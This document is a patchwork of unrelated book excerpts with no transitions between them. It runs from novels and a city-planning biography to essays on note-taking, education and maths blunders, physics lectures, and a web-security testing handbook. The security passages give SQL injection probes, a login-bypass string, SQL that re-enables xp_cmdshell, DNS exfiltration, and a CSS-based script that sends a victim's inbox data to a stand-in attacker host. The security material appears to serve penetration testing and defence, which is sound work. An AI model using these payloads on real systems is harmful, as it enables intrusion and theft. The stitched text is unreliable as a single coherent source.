The lake ranged from four to nine feet deep, and tourists were not encouraged to throw coins into it, but many of them did anyway, which meant a problem with the homeless, three of whom had so far drowned in their efforts to harvest some of the cash stippling the Gunite bottom. Still, the Battle-Lake was a major tourist attraction, at least as popular as that other place’s volcano, and so the occasional loss of a homeless person (who by definition was not a paying customer, after all) was a not unreasonable price to pay.

Kelp knew this wasn’t everybody’s experience. John and May, for instance, and others he could think of. But for himself, up until now, it had always been true that every new pairing started off on a happy high, which gradually ebbed, like the tide. Short relationships, therefore, tended to leave a residue of nostalgia, a semihappy glow in which the rough spots were gauzed over and the highlights highlighted, while longer relationships tended to come to a close with bitterness and recrimination, bruised egos and unresolvable disputes, so that only the wens and warts remained outstanding in the memory.

When you are probing for SQL injection vulnerabilities, be sure to walk through to completion any multistage processes in which you submit crafted input. Applications frequently gather a collection of data across several requests, and they persist this to the database only after the complete set has been gathered. In this situation, you will miss many SQL injection vulnerabilities if you only submit crafted data within each individual request and monitor the application's response to that request.

Submit a single quotation mark as the item of data you are targeting. Observe whether an error occurs, or whether the result differs from the original in any other way. If a detailed database error message is received, consult the “SQL Syntax and Error Reference” section of this chapter to understand its meaning. 2. If an error or other divergent behavior was observed, submit two single quotation marks together. Databases use two single quotation marks as an escape sequence to represent a literal single quote, so the sequence is interpreted as data within the quoted string rather than the closing string terminator. If this input causes the error or anomalous behavior to disappear, the application is probably vulnerable to SQL injection.

Try supplying a simple mathematical expression that is equivalent to the original numeric value. For example, if the original value is 2, try submitting 1 + 1 or 3-1. If the application responds in the same way, it may be vulnerable. 2. The preceding test is most reliable in cases where you have confirmed that the item being modified has a noticeable effect on the application's behavior. For example, if the application uses a numeric PageID parameter to specify which content should be returned, substituting 1 + 1 for 2 with equivalent results is a good sign that SQL injection is present.

A good example of this is the ASCII command, which returns the numeric ASCII code of the supplied character. For example, because the ASCII value of A is 65, the following expression is equivalent to 2 in SQL: 67-ASCII(‘A’) 4. The preceding test will not work if single quotes are being filtered. However, in this situation you can exploit the fact that databases implicitly convert numeric data to string data where required. Hence, because the ASCII value of the character 1 is 49, the following expression is equivalent to 2 in SQL: 51-ASCII(1)

& and = are used to join name/value pairs to create the query string and the block of POST data. You should encode them using %26 and %3d, respectively. Literal spaces are not allowed in the query string. If they are submitted, they will effectively terminate the entire string. You should encode them using + or %20. Because + is used to encode spaces, if you want to include an actual + in your string, you must encode it using %2b. In the previous numeric example, therefore, 1+1 should be submitted as 1%2b1. The semicolon is used to separate cookie fields and should be encoded using %3b.

In some applications, input from the user is validated on arrival by escaping a single quote. In the original book search example, this approach appears to be effective. When the user enters the search term O'Reilly, the application makes the following query: SELECT author,title,year FROM books WHERE publisher = ‘O’‘Reilly’ Here, the single quotation mark supplied by the user has been converted into two single quotation marks. Therefore, the item passed to the database has the same literal significance as the original expression the user entered.

These functions can be used together to extract a single character from a string in numeric form. For example: SUBSTRING(‘Admin’,1,1) returns A. ASCII(‘A’) returns 65. Therefore: ASCII(SUBSTR(‘Admin’,1,1)) returns 65. Using these two functions, you can systematically cut a string of useful data into its individual characters and return each of these separately, in numeric form. In a scripted attack, this technique can be used to quickly retrieve and reconstruct a large amount of string-based data one byte at a time.

The UTL_INADDR package is designed to be used to resolve hostnames to IP addresses. It can be used to generate arbitrary DNS queries to a server controlled by the attacker. In many situations, this is more likely to succeed than the UTL_HTTP attack, because DNS traffic is often allowed out through corporate firewalls even when HTTP traffic is restricted.

Suppose that you have not identified any method of transmitting the results of your injected queries back to the browser. Nevertheless, you have already seen how you can use SQL injection to modify the application's behavior. For example, submitting the following two pieces of input causes very different results: admin' AND 1=1-- admin' AND 1=2-- In the first case, the application logs you in as the admin user. In the second case, the login attempt fails, because the 1=2 condition is always false. You can leverage this control of the application's behavior as a means of inferring the truth or falsehood of arbitrary conditions within the database itself.

SELECT X FROM Y WHERE C This causes the database to work through each row of table Y, evaluating condition C, and returning X in those cases where condition C is true. If condition C is never true, the expression X is never evaluated. This behavior can be exploited by finding an expression X that is syntactically valid but that generates an error if it is ever evaluated. An example of such an expression in Oracle and MS-SQL is a divide-by-zero computation, such as 1/0. If condition C is ever true, expression X is evaluated, causing a database error. If condition C is always false, no error is generated. You can, therefore, use the presence or absence of an error to test an arbitrary condition C.

MS-SQL Perhaps the most notorious piece of database functionality that an attacker can misuse is the xp_cmdshell stored procedure, which is built into MS-SQL by default. This stored procedure allows users with DBA permissions to execute operating system commands in the same way as the cmd.exe command prompt. For example: master..xp_cmdshell ‘ipconfig > foo.txt’

Because MS-SQL runs by default as LocalSystem, the attacker typically can fully compromise the underlying operating system, performing arbitrary actions. MS-SQL contains a wealth of other extended stored procedures, such as xp_regread and xp_regwrite, that can be used to perform powerful actions within the registry of the Windows operating system.

Most installations of MS-SQL encountered on the Internet will be MS-SQL 2005 or later. These versions contain numerous security features that lock down the database by default, preventing many useful attack techniques from working. However, if the web application's user account within the database is sufficiently high-privileged, it is possible to overcome these obstacles simply by reconfiguring the database. For example, if xp_cmdshell is disabled, it can be re-enabled with the sp_configure stored procedure. The following four lines of SQL do this: EXECUTE sp_configure ‘show advanced options’, 1 RECONFIGURE WITH OVERRIDE EXECUTE sp_configure ‘xp_cmdshell’, ‘1’ RECONFIGURE WITH OVERRIDE At this point, xp_cmdshell is re-enabled

An attacker could exploit the shared component to bypass all server-side input validation. At each stage of the quotation process, the application performed strict validation of the data expected at that stage and rejected any data that failed this validation. But the shared component updated the application's state with every parameter supplied by the user. Hence, if an attacker submitted data out of sequence by supplying a name/value pair that the application expected at an earlier stage, that data would be accepted and processed, with no validation having been performed.

The developers' assumption was flawed because they overlooked the possibility that a user would attempt to process a transfer for a negative amount. Any negative number would clear the approval test, because it is less than the threshold. However, the banking module of the application accepted negative transfers and simply processed them as positive transfers in the opposite direction. Hence, any user who wanted to transfer $20,000 from account A to account B could simply initiate a transfer of –$20,000 from account B to account A, which had the same effect and required no approval.

Choose a unique arbitrary string that does not appear anywhere within the application and that contains only alphabetical characters and therefore is unlikely to be affected by any XSS-specific filters. For example: myxsstestdmqlwp Submit this string as every parameter to every page, targeting only one parameter at a time. 2. Monitor the application's responses for any appearance of this same string. Make a note of every parameter whose value is being copied into the application's response. These are not necessarily vulnerable, but each instance identified is a candidate for further investigation, as described in the next section. 3. Note that both GET and POST requests need to be tested. You should include every parameter within both the URL query string and the message body. Although a smaller range of delivery mechanisms exists for XSS vulnerabilities that can be triggered only by a POST request, exploitation is still possible, as previously described. 4. In any cases where XSS was found in a POST request, use the “change request method” option in Burp to determine whether the same attack could be performed as a GET request. 5. In addition to the standard request parameters, you should test every instance in which the application processes the contents of an HTTP request header. A common XSS vulnerability arises in error messages, where items such as the Referer and User-Agent headers are copied into the message's contents. These headers are valid vehicles for delivering a reflected XSS attack, because an attacker can use a Flash object to induce a victim to issue a request containing arbitrary HTTP headers.

When the browser loads the scripts specified in the remainder of the HTML page, they are loaded from the server you specified, yet they are still executed in the context of the page that has invoked them. For example: <base href="http://mdattacker.net/badscripts/"> ...  <script src="goodscript.js"></script>

The standard defense against CSRF attacks is to supplement HTTP cookies with additional methods of tracking sessions. This typically takes the form of additional tokens that are transmitted via hidden fields in HTML forms. When each request is submitted, in addition to validating session cookies, the application verifies that the correct token was received in the form submission. Assuming that the attacker has no way to determine the value of this token, he cannot construct a cross-domain request that succeeds in performing the desired action.

To deliver the key trick of having the victim user see one interface but interact with a different one, the attacker can employ various CSS techniques. The iframe that loads the target interface can be made an arbitrary size, in an arbitrary location within the attacker's page, and showing an arbitrary location within the target page. Using suitable style attributes, it can be made completely transparent so that the user cannot see it.

A more robust method for an application to prevent an attacker from framing its pages is to use the X-Frame-Options response header. It was introduced with Internet Explorer 8 and has since been implemented in most other popular browsers. The X-Frame-Options header can take two values. The value deny instructs the browser to prevent the page from being framed, and sameorigin instructs the browser to prevent framing by third-party domains.

To exploit this behavior, an attacker needs to host a page on his own domain that includes the injected response as a CSS stylesheet. This causes any embedded CSS definitions to be applied within the attacker's own page. These can then be queried using JavaScript to retrieve the captured data. For example, the attacker can host a page containing the following: <link rel="stylesheet" href="https://wahh-mail.com/inbox" type="text/css"> <script>    document.write(‘<img src="http://mdattacker.net/capture?’ +  escape(document.body.currentStyle.fontFamily) + ‘">’); </script>

To overcome this obstacle, the attacker can induce a user to load the same page over HTTPS by modifying any HTTP response to cause a redirection or by rewriting the targets of links in another response. When the user loads the help page over HTTPS, her browser performs the specified script include using HTTP. Crucially, some browsers do not display any warnings in this situation. The attacker can then return his arbitrary script code in the response for the included script. This script executes in the context of the HTTPS response, allowing the attacker to compromise this and further content that is accessed over HTTPS.

You might think that a security-paranoid user would be safe from this technique. Suppose the user accesses only one website at a time and restarts his browser before accessing each new site. Suppose he logs in to his banking application, which uses pure HTTPS, from a clean new browser. Can he be compromised by an active man-in-the-middle attack? The disturbing answer is that yes, he probably can be compromised. Today's browsers make numerous plain HTTP requests in the background, regardless of which domains the user visits. Common examples include antiphishing lists, version pings, and requests for RSS feeds. An attacker can respond to any of these requests with a redirection to the targeted domain using HTTP. When the browser silently follows the redirection, one of the attacks already described can be delivered, first to compromise the HTTP origin for the targeted domain, and then to escalate this compromise into the HTTPS origin.

When you are probing the application for common vulnerabilities by submitting crafted attack strings in different parameters, always monitor the application's responses to identify any error messages that may contain useful information. Attempt to force an error response from the application by supplying encrypted data strings in the wrong context, or by performing actions on resources that are not in the correct state to handle the action. 2. Be aware that error information that is returned within the server's response may not be rendered on-screen within the browser. An efficient way to identify many error conditions is to search each raw response for keywords that are often contained in error messages. For example:  error exception illegal invalid fail stack access directory file not found varchar ODBC SQL SELECT 3. When you send a series of requests modifying parameters within a base request, check whether the original response already contains any of the keywords you are looking for to avoid false positives. 4. You can use the Grep function of Burp Intruder to quickly identify any occurrences of interesting keywords in any of the responses generated by a given attack (see Chapter 14).

Keating had had a long conversation with him, one dreary November afternoon, on the subject of old porcelain. It was Heyer’s hobby; he owned a famous collection, passionately gathered. Keating displayed an earnest knowledge of the subject, though he had never heard of old porcelain till the night before, which he had spent at the public library. Heyer was delighted; nobody in the office cared about his hobby, few ever noticed his presence.

It happened that Pat Noonan offered Ellsworth a bag of jelly beans in exchange for a surreptitious peek at his test paper. Ellsworth took the jelly beans and allowed Pat to copy his test. A week later, Ellsworth marched up to the teacher, laid the jelly beans, untouched, upon her desk and confessed his crime, without naming the other culprit. All her efforts to extract that name could not budge him; Ellsworth remained silent; he explained only that the guilty boy was one of the best students, and he could not sacrifice the boy’s record to the demands of his own conscience. He was the only one punished—kept after school for two hours. Then the teacher had to drop the matter and let the test marks remain as they were. But it threw suspicion on the grades of Johnny Stokes, Pat Noonan, and all the best pupils of the class, except Ellsworth Toohey.

He did not smile at his employees, he did not take them out for drinks, he never inquired about their families, their love lives or their church attendance. He responded only to the essence of a man: to his creative capacity. In this office one had to be competent. There were no alternatives, no mitigating considerations. But if a man worked well, he needed nothing else to win his employer’s benevolence: it was granted, not as a gift, but as a debt. It was granted, not as affection, but as recognition.

There was so much to build that none of them thought of wasting structural effort on their own shelters.

Have you seen the converted brownstones in which the average self-supporting couple has to live? Have you seen their closet kitchens and their plumbing? They’re forced to live like that—because they’re not incompetent enough. They make forty dollars a week and wouldn’t be allowed into a housing project. But they’re the ones who provide the money for the damn project. They pay the taxes. And the taxes raise their own rent. And they have to move from a converted brownstone into an unconverted one and from that into a railroad flat. I’d have no desire to penalize a man because he’s worth only fifteen dollars a week. But I’ll be damned if I can see why a man worth forty must be penalized—and penalized in favor of the one who’s less competent.

Yet people call me corrupt. Why? The saint in a cloister sacrifices only material things. It’s a small price to pay for the glory of his soul. He hoards his soul and gives up the world.

He’s paying the price and wondering for what sin and telling himself that he’s been too selfish. In what act or thought of his has there ever been a self? What was his aim in life? Greatness—in other people’s eyes. Fame, admiration, envy—all that which comes from others. Others dictated his convictions, which he did not hold, but he was satisfied that others believed he held them. Others were his motive power and his prime concern. He didn’t want to be great, but to be thought great. He didn’t want to build, but to be admired as a builder. He borrowed from others in order to make an impression on others. There’s your actual selflessness. It’s his ego that he’s betrayed and given up. But everybody calls him selfish.”

Convinced he was right, he had refused to soil the white suit of idealism with compromise. He had really believed that if his system was right—scientific, logical, fair—and if it got a hearing, the system would be adopted. In free and open encounter would not Truth prevail? And he had gotten the hearing. But Moses had failed in his calculations to give certain factors due weight. He had not sufficiently taken into account greed. He had not sufficiently taken into account self-interest. And, most of all, he had not sufficiently taken into account the need for power.

When Moses complained about the inefficiency—the shipyard often had scores of hulls and not a single keel to attach them to— he was ignored by Hog Island officials. Trying to outflank the officials, he wrote a report detailing the inefficiency and proposing a complete new material-procurement method and persuaded Van Schaick to give it directly to Washington. Washington was impressed and called the local officials on the carpet. Their response was to wait until Washington's interest died down and then call Moses in and fire him.

Belle altered the pattern. Instead of loudly denouncing conditions at the academies, she quietly checked incorporation certificates to learn the names of their owners—and found that they included both Tammany leaders and community pillars. Instead of giving the names to the newspapers, which would have brought headlines but not results, since all her ammunition would have been used up, she went to the leaders and pillars and told them she would keep their names secret if they saw to it that regulatory legislation was passed—and strictly enforced. It was.

With reform leaders taking the floor to argue for its principles, many of its key points were adopted by the Constitutional Convention. But Tammany and the upstate bosses outwitted the reformers by persuading them to combine all the proposed constitutional amendments in a single package, and distaste for one or two unimportant but unpopular amendments, combined with a quiet mobilization of Tammany and upstate machines, resulted in the defeat of the package in a November 1915 referendum.

She was more practical; she wanted to do the same things as Moses, but she wanted to concentrate on what was possible and not jeopardize the attaining of those things by stirring up trouble in other areas."

Nor had Smith's actions been pro forma when the Black Horse Cavalry refused his request for $75,000 to enable the commission to begin work. Here was a ready-made opportunity to reap political capital. As Mrs. Moskowitz had surmised, the GOP's federal wing raged against their party's legislators, along with most of the state's important newspapers. Without doing anything else, simply by letting the commission die and pointing out that the Legislature had killed it, Smith would have scored a political coup.

The system here proposed is more democratic, not more "royal," than that now in existence. Democracy does not merely mean periodic elections. It means a government held accountable to the people between elections. In order that the people may hold their government to account they must have a government that they can understand. No citizen can hope to understand the present collection of departments, offices, boards and commissions, or the present methods of appropriating money.

Human knowledge is not a mere collection, but a structure; it is a single body of interrelated cognitions. No item of knowledge is “self-contained”; taken as isolated from all the rest, no item even qualifies as knowledge. On the contrary, such an item, being closed to potentially relevant evidence, is a form of unreason, and as such must be rejected. This rejection does not mean a condemnation of cognitive specialization. What the theory condemns is any specialist who claims a logical right to ignore discoveries in all fields but his own, on the grounds that his exists in a cognitive vacuum and is thus self-validating.

Every other detail of the story, apart from its bare prediction that winter happens once a year, is just as easily variable. So, although the myth was created to explain the seasons, it is only superficially adapted to that purpose. When its author was wondering what could possibly make a goddess do something once a year, he did not shout, ‘Eureka! It must have been a marriage contract enforced by a magic seed.’ He made that choice – and all his substantive choices as author – for cultural and artistic reasons, and not because of the attributes of winter at all.

We can make progress in achieving those purposes because we can express them in terms of those quasi-autonomous emergent properties about which we have good high-level explanations.

shortly after, he would look at his brief notes and think about their relevance for his own thinking and writing. He then would turn to the main slip-box and write his ideas, comments and thoughts on new pieces of paper, using only one for each idea and restricting himself to one side of the paper, to make it easier to read them later without having to take them out of the box. He kept them usually brief enough to make one idea fit on a single sheet, but would sometimes add another note to extend a thought.

The consideration of how to structure a topic, therefore, belongs on notes as well – and not on a meta-hierarchical level. We can provide ourselves with a (temporarily valid) overview over a topic or subtopic just by making another note. If we then link from the index to such a note, we have a good entry point. If the overview on this note ceases to correctly represent the state of a cluster or topic, or we decide it should be structured differently, we can write a new note with a better structure and update the respective link from the index.

These note-to-note links are like the “weak links” (Granovetter 1973) of social relationships we have with acquaintances: even though they are usually not the ones we turn to first, they often can offer new and different perspectives.

A truly wise person is not someone who knows everything, but someone who is able to make sense of things by drawing from an extended resource of interpretation schemes. This stands in harsh contrast to the common but not-so-wise belief that we need to learn from experience. It is much better to learn from the experiences of others – especially when this experience is reflected on and turned into versatile “mental models” that can be used in different situations.

Studies on creativity with engineers show that the ability to find not only creative, but functional and working solutions for technical problems is equal to the ability to make abstractions. The better an engineer is at abstracting from a specific problem, the better and more pragmatic his solutions will be – even for the very problem he abstracted from (Gassmann and Zeschky, 2008, 103).

But instead of counting the bullet holes on the returned planes, he recommended armouring the spots where none of the planes had taken any hits.

If we accompany every step of our work with the question, “What is interesting about this?” and everything we read with the question, “What is so relevant about this that it is worth noting down?” we do not just choose information according to our interest. By elaborating on what we encounter, we also discover aspects we didn’t know anything about before and therefore develop our interests along the way.

He senses that what is demanded of him is not knowledge but rather that he project a certain kind of personality, an affable complaisance.

But such work is subject to attack on two fronts—some of it goes to offshore accountants and some of it is done by tax preparation software, such as TurboTax.

Robert Jackall offers a more plausible account of the role these teenaged and immigrant Einsteins are playing at Best Buy. Based on hundreds of hours of interviews with corporate managers, he concludes that one of the principles of contemporary management is to “push details down and pull credit up.”17 That is, avoid making decisions, because they could damage your career, but then spin cover stories after the fact that interpret positive outcomes to your credit. To this end, upper management deals only with abstractions, not operational details. If things go well: “Finding cross-marketing synergies in the telecommunications and consumer electronics divisions has improved our strategic outlook heading into the fourth quarter.” If things go badly: “Change the Vonage display?

A good part of the job, then, consists of “a constant interpretation and reinterpretation of events that constructs a reality in which it is difficult to pin blame on anyone, especially oneself,” according to Calhoun. This gives rise to the art of talking in circles. Mutually contradictory statements are made to cohere by sheer forcefulness of presentation, allowing a manager to “stake out a position on every side of an issue.

Such concerns can be rendered appropriate, and higher-level management support secured, only by demonstrating how they contribute to profits. Not because the higher-level managers are heartless, but because such a demonstration provides everyone needed cover. In fact, a lower-level manager may need only to put on a performance of hardheadedness before her superiors, and produce the stage props of a profit-maximizing calculation (graphs, charts, and so on). Unless she has these skills of the corporate dramatist, she is unlikely to get the official cover she needs to do the right thing by her workers.

The author says her “favorite” moment is when “the group becomes paralyzed. No one person wants to be the person to come off contact—so they don’t take risks.” Having induced this group paralysis, she then sets out to re-create the spirit of innovation and charismatic rule breaking, now as a function of the Team. The most innovative groups question the “standing” starting point of the exercise. They notice that it’s hard to make the switch from standing to the kneeling position that is required to make the last move to the floor and keep in contact with the dowel. So they ask if they can start from a kneeling position. I generally approve this as I feel that the group is learning and questioning some unspoken rules.28 So here is a group of people on their knees, finally. It was their own idea, erupting from the collective genius of the Team. Together, these mavericks develop the force of personality to “question some unspoken rules”—for example, that old canard that it’s better to stand on your own two feet.

In most work that transpires in large organizations, one’s work is meaningless taken by itself. The individual feels that, alone, he is without any effect. His education prepares him for this; it is an education for working in a large organization, and he has difficulty imagining how he might earn a living otherwise. This predisposes him to be deferential to the authority exercised in the organization (however tinged with irony this deference may be), since the organization is that which gives meaning to his work.

Ohm’s law is something explicit and rulelike, and is true in the way that propositions are true. Its utter simplicity makes it beautiful; a mind in possession of this equation is charmed with a sense of its own competence. We feel we have access to something universal, and this affords a pleasure that is quasi-religious, perhaps. But this charm of competence can get in the way of noticing things; it can displace, or perhaps hamper the development of, a different kind of knowledge that may be difficult to bring to explicit awareness, but is superior as a practical matter. Its superiority lies in the fact that it begins with the typical rather than the universal, so it goes more rapidly and directly to particular causes, the kind that actually tend to cause ignition problems.

sometimes the system gives the wrong trouble code. Being off by one digit might give a diagnosis of “System fuel too lean on bank one” (P0171), that is, an air-fuel mixture that is too much air and not enough fuel on the first bank of cylinders, when in fact the problem is “System fuel too rich on bank two” (P0172). An experienced mechanic can tell too lean from too rich by looking at the spark plugs; they will look blanched white in the first case and sooty in the second. Representing states of the world in a merely formal way, as “information” of the sort that can be coded, allows them to be entered into a logical syllogism of the sort that computerized diagnostics can solve. But this is to treat states of the world in isolation from the context in which their meaning arises, so such representations are especially liable to nonsense.

Think about all the classes you ever took. How many failed to teach you any useful skills? The lessons you’ll never need to know after graduation start in kindergarten. Elementary schools teach more than reading, writing, and arithmetic. They also require history, social studies, music, art, and physical education. Middle and high schools add higher mathematics, classic literature, and foreign languages—vital for a handful of budding scientists, authors, and translators, irrelevant for everyone else.

Defenders of the real-world relevance of education love to invoke engineering. Engineering students learn how to make stuff work; employers hire them to make stuff work. Engineering has well-defined subbranches, each with straightforward applications: electrical, mechanical, civil, nuclear. Before we get carried away, we should accept a key fact: Engineering is a challenging, hence unpopular, major. Psychologists outnumber engineers. Artists outnumber engineers. Social scientists plus historians outnumber engineers almost two to one.

The same goes for knowledge. Yes, you “might need” Latin one day. Maybe a time machine will strand you in ancient Rome. Still, does it make sense to study a dead language for years to prepare for a scenario you almost certainly won’t face? You cannot retreat to agnosticism. “No one knows if this trash will come in handy” is a crazy argument for hoarding trash. “No one knows if this knowledge will come in handy” is a crazy argument for hoarding knowledge.

Surveys of adults’ knowledge of reading, math, history, civics, science, and foreign languages are already on the shelf. The results are stark: Basic literacy and numeracy are virtually the only book learning most American adults possess. While the average American spends years and years studying other subjects, they recall next to nothing about them. If schools teach us everything we know about history, civics, science, and foreign languages, their achievement is pitiful.

Given these low standards, you might think that virtually all Americans would score at the Intermediate or Proficient level in every subject. Not even close (see Figure 2.3). The ignorance revealed by the NAAL is numbing. Only modest majorities are Intermediate or Proficient on the prose and document tests. Under half are Intermediate or Proficient on the quantitative test. Reviewing specific questions underscores the severity of the ignorance. Barely half know that saving $.05 per gallon on 140 gallons of oil equals $7.00. Thirty-five percent of Americans can’t correctly enter a name and address on a Certified Mail form—with no points off for misspelling!

How do the NAAL results look if you break them down by education? If you mentally picture “high school graduates,” you probably see them as Intermediate or Proficient in literacy and numeracy. If you mentally picture “college students,” you probably see them as Proficient in literacy and numeracy. Such mental pictures do not fit the facts.

One could look at these facts and conclude the public’s historical and civic knowledge is no worse than its literacy. Yet such optimism overlooks a key point: knowing half a subject’s basic facts does not make you “halfway proficient.” If you know only half the letters in the alphabet, you are illiterate. Why? Because you lack knowledge of basic facts on which all reading depends. The same holds for the ABCs of history and civics. Not knowing the three branches of government isn’t like not knowing Hamlet; it’s like not knowing the letter “h.” If you don’t know that the Civil War came after the Declaration of Independence, you don’t understand American history. If you don’t know which parties control the House and the Senate, you don’t understand American politics.

Americans’ staggering ignorance may not be a death blow for human capital purism, but it is an awkward fact. If we learn so little in school, why do employers so heavily reward education? The simplest response is that employers, like teachers, grade on a curve. Intermediate literacy and numeracy horrify intellectuals. From an employer’s point of view, however, intermediate is way better than basic—or below basic.

Many experiments study transfer of learning under seemingly ideal conditions. Researchers teach subjects how to answer Question A. Then they immediately ask their subjects Question B, which can be handily solved using the same approach as Question A. Unless A and B look alike on the surface, or subjects get a heavy-handed hint to apply the same approach, learning how to solve Question A rarely helps subjects answer Question B.

Since subjects hear these two stories back to back, you might think almost everyone would leap to the convergence solution for the medical problem. They don’t. A typical success rate is 30%. Since about 10% of subjects who don’t hear the military problem offer the convergence solution, only one in five subjects transferred what they learned. To reach a high (roughly 75%) success rate, you need to teach subjects the first story, then bluntly tell them to use the first story to solve the second.37 To repeat, such experiments measure how humans “learn how to think” under ideal conditions:

To apply schoolwork in the real world, you must normally overcome each and every one of these hurdles. You must see through surface features to underlying structure. You must select the few relevant lessons, and ignore the rest. You must remember relevant lessons years or decades after encountering them. You must apply what you learned in a nonacademic location, without your original teacher (or any teacher!) to hold your hand.

As humans, we are not good at judging the size of large numbers. And even when we know one is bigger than another, we don’t appreciate the size of the difference. I had to go on the BBC News in 2012 to explain how big a trillion is. The UK debt had just gone over £1 trillion and they wheeled me out to explain that that is a big number. Apparently, shouting, ‘It’s really big, now back to you in the studio!’ was insufficient, so I had to give an example.

During our lives we learn that numbers are linear; that the spaces between them are all the same. If you count from one to nine, each number is one more than the previous one. If you ask someone what number is halfway between one and nine, they will say five – but only because they have been taught to. Wake up, sheeple! Humans instinctively perceive numbers logarithmically, not linearly. A young child or someone who has not been indoctrinated by education will place three halfway between one and nine.

Usually, the machine would be restarted before that happened, and the countdown would begin again from 4,294,967,295.

Luigi’s breakthrough was to keep the standard every-fourth-year leap year of the Julian calendar but to take out three leap days every four hundred years. Leap years were all the years divisible by four, and all Luigi suggested was to remove the leap days from years which were also a multiple of 100 (apart from those that were also a multiple of 400). This now averages out to 365.2425 days per year; impressively close to the desired tropical year of around 365.2422 days.

Trains in Switzerland are not allowed to have 256 axles. This may be a great obscure fact, but it is not an example of European regulations gone mad. To keep track of where all the trains are on the Swiss rail network, there are detectors positioned around the rails. They are simple detectors which are activated when a wheel goes over a rail, and they count how many wheels there are to provide some basic information about the train which has just passed. Unfortunately, they keep track of the number of wheels using an 8-digit binary number, and when that number reaches 11111111 it rolls over to 00000000. Any trains which bring the count back to exactly zero move around undetected, as phantom trains.

The ocean is not a neat, flat surface; it’s constantly sloshing around. And that’s before you get to the Earth’s uneven gravitational field, which alters sea heights. So a country needs to make a decision on its sea level. The UK uses the average height of the water in the English Channel as measured from the town of Newlyn in Cornwall once an hour between 1915 and 1921.

The problem arose because the German and Swiss definitions of ‘sea level’ differed by 27 centimetres and, without compensating for the difference, the bridge would not match in the middle. But that was not the maths mistake. The engineers realized there would be a sea-level discrepancy, calculated the exact difference of 27 centimetres and then … subtracted it from the wrong side. When the two halves of the 225-metre bridge met in the middle, the German side was 54 centimetres higher than the Swiss side.

we’ll go back a step and look at the actual sensors that are sending the SRI the data and see what range of values they can possibly produce. For three of the inconvenient seven it was found that the input could never be big enough to cause an operand error, so protection was not added. The other four variables could possibly be too big, so they were always run through the safety check. Which was all great … for the Ariane 4 rocket, the precursor of the Ariane 5. After years of faithful service, the SRI was pulled out of the Ariane 4 and used in the Ariane 5 without a proper check of the code. The Ariane 5 was designed with a different take-off trajectory to the Ariane 4, which involved greater horizontal speeds early in the launch. The trajectory of an Ariane 4 meant that this horizontal velocity would never be big enough to cause a problem, so it was not checked. But on the Ariane 5 it quickly exceeded the space available for the value within the SRI and the system threw out an operand error. But this alone was not what brought the rocket down.

A different mathematical friend of mine does consulting work about the mathematics of a very public-facing area of safety. They will be hired by one company to do some research and uncover industry-wide mistakes. But then, when working for a different company or even advising the government on safety guidelines, they will not be able to disclose what they previously discovered on someone else’s dime. It’s all a bit silly.

I’ve tried to wangle the Parker Square back to being a mascot of the importance of giving something a go, even when you’re likely to fail. The experience people seem to have at school is that getting something wrong in maths is terrible and to be avoided at all costs. But you’re not going to be able to stretch yourself and try new challenges without occasionally going wrong. So, as some kind of compromise, the Parker Square has ended up being ‘a mascot for people who give it a go but ultimately fall short’.

We may vary the words, and ask the same thing in many different ways: What is required? What do you want to find? What are you supposed to seek?

Trying to swim, you imitate what other people do with their hands and feet to keep their heads above water, and, finally, you learn to swim by practicing swimming.

The worst may happen if the student embarks upon computations or constructions without having understood the problem. It is generally useless to carry out details without having seen the main connection, or having made a sort of plan. Many mistakes can be avoided if, carrying out his plan, the student checks each step. Some of the best effects may be lost if the student fails to reexamine and to reconsider the completed solution.

Trying to use known results and going back to definitions are among the best reasons for introducing auxiliary elements; but they are not the only ones. We may add auxiliary elements to the conception of our problem in order to make it fuller, more suggestive, more familiar although we scarcely know yet explicitly how we shall be able to use the elements added. We may just feel that it is a “bright idea” to conceive the problem that way with such and such elements added.

Second, where we stumbled once, there we are likely to stumble again if the circumstances are the same as before.

Therefore, I start out cautiously in the direction indicated by my plan and keep a lookout for signs of progress. If the signs are rare or indistinct, I become more hesitant. And if for a long time they fail to appear altogether, I may lose courage, turn back, and try another road. On the other hand, if the signs become more frequent as I proceed, if they multiply, my hesitation fades, my spirits rise, and I move with increasing confidence, just as Columbus and his companions did before sighting the island of San Salvador.

The future mathematician learns, as does everybody else, by imitation and practice. He should look out for the right model to imitate. He should observe a stimulating teacher. He should compete with a capable friend. Then, what may be the most important, he should read not only current textbooks but good authors till he finds one whose ways he is naturally inclined to imitate. He should enjoy and seek what seems to him simple or instructive or beautiful. He should solve problems, choose the problems which are in his line, meditate upon their solution, and invent new problems.

Then the repulsion will be less than the attraction. This is the reason why the atoms, which are constituted out of plus and minus electric charges, feel very little force when they are separated by appreciable distance (aside from gravity). When they come close together, they can “see inside” each other and rearrange their charges, with the result that they have a very strong interaction.

the existence of the positive charge, in some sense, distorts, or creates a “condition” in space, so that when we put the negative charge in, it feels a force. This potentiality for producing a force is called an electric field. When we put an electron in an electric field, we say it is “pulled.”

What keeps the electrons from simply falling in? This principle: If they were in the nucleus, we would know their position precisely, and the uncertainty principle would then require that they have a very large (but uncertain) momentum, i.e., a very large kinetic energy. With this energy they would break away from the nucleus. They make a compromise: they leave themselves a little room for this uncertainty and then jiggle with a certain amount of minimum motion in accordance with this rule.

This fundamental theory of the interaction of light and matter, or electric field and charges, is our greatest success so far in physics. In this one theory we have the basic rules for all ordinary phenomena except for gravitation and nuclear processes. For example, out of quantum electrodynamics come all known electrical, mechanical, and chemical laws: the laws for the collision of billiard balls, the motions of wires in magnetic fields, the specific heat of carbon monoxide, the color of neon signs, the density of salt, and the reactions of hydrogen and oxygen to make water are all consequences of this one law.

These are called leptons, and they are the following: there is the electron, which has a very small mass on this scale, only  MeV. Then there is that other, the -meson, the muon, which has a mass much higher,  times as heavy as an electron. So far as we can tell, by all experiments so far, the difference between the electron and the muon is nothing but the mass. Everything works exactly the same for the muon as for the electron, except that one is heavier than the other.

If ever Mr. Edwards had a chance it was now. And indeed a little warning buzz did sound in his brain, but it was not loud enough. About eighty per cent of the girls who came to him needed money to pay off a mortgage. And Mr. Edwards made it an unvarying rule not to believe anything his girls said at any time, beyond what they had for breakfast, and they sometimes lied about that.

Samuel may have thought and played and philosophized about death, but he did not really believe in it. His world did not have death as a member. He, and all around him, was immortal. When real death came it was an outrage, a denial of the immortality he deeply felt, and the one crack in his wall caused the whole structure to crash. I think he had always thought he could argue himself out of death. It was a personal opponent and one he could lick.

